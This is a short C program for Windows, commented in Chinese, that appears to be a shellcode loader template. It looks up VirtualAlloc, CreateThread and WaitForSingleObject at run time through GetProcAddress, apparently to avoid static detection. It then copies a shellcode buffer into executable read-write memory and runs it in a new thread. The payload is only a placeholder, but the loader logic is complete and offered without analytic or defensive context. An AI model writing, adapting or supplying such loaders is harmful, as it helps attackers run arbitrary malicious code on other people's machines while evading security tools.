#include <windows.h>
#include <strsafe.h>
#include <stdio.h>

//定义API函数指针类型
typedef LPVOID(WINAPI* PVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef HANDLE(WINAPI* PCreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef DWORD(WINAPI* PWaitForSingleObject)(HANDLE, DWORD);

void executeShellcode() {
    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
    if (!hKernel32) {
        return;
    }

    //动态解析API函数
    PVirtualAlloc funcVirtualAlloc = (PVirtualAlloc)GetProcAddress(hKernel32, "VirtualAlloc");
    PCreateThread funcCreateThread = (PCreateThread)GetProcAddress(hKernel32, "CreateThread");
    PWaitForSingleObject funcWaitForSingleObject = (PWaitForSingleObject)GetProcAddress(hKernel32, "WaitForSingleObject");

    if (!funcVirtualAlloc || !funcCreateThread || !funcWaitForSingleObject) {
        return;
    }

    //Shellcode示例
    unsigned char shellcode[] = "[Shellcode]";  //嵌入Shellcode

    //分配内存并复制shellcode
    LPVOID shellcodeExec = funcVirtualAlloc(0, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!shellcodeExec) {
        return;
    }
    memcpy(shellcodeExec, shellcode, sizeof(shellcode));

    //创建线程执行shellcode
    DWORD threadID;
    HANDLE hThread = funcCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)shellcodeExec, NULL, 0, &threadID);
    if (!hThread) {
        return;
    }

    //等待线程执行完毕
    funcWaitForSingleObject(hThread, INFINITE);
}

int main() {
    executeShellcode();
    return 0;
}
